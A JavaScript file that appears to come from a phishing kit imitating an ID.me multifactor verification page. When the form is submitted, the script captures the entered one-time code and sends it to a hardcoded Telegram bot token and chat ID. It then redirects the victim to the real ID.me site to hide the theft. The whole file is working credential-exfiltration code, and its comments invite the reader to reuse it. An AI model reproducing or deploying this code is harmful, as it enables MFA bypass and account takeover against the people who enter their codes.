let formm;
let counterr;
let email_field;
let submit_btn;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Page loaded");
  counterr = document.querySelector(".counterr");
  email_field = document.getElementById("multifactor_code");
  submit_btn = document.querySelector("button[type='submit']");
  formm = document.getElementById("new_multifactor");

  formm.addEventListener("submit", (e) => {
    e.preventDefault();
    send_telegram_message();
  });
});

async function send_telegram_message() {
  const chatIds = ["-1001991348429"]; // Add your chat IDs here
  const verificationCode = email_field.value;
  const msg = `Retry Verification code: ${verificationCode}`;

  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };

    try {
      const resp = await fetch(
        `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`, // Replace 'your_bot_token' with your actual bot token
        {
          method: "POST",
          headers: {
            accept: "application/json",
            "content-type": "application/json",
          },
          body: JSON.stringify(data),
        }
      );

      const resJson = await resp.json();
      console.log(resJson);
      
      if (resJson.ok) {
        console.log("Message sent successfully");
      } else {
        console.error("Telegram API response indicates failure:", resJson);
      }

      // Redirect to the next page after sending the message
      window.location.href = "https://api.id.me"; // Replace with the URL of the next page
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  }
}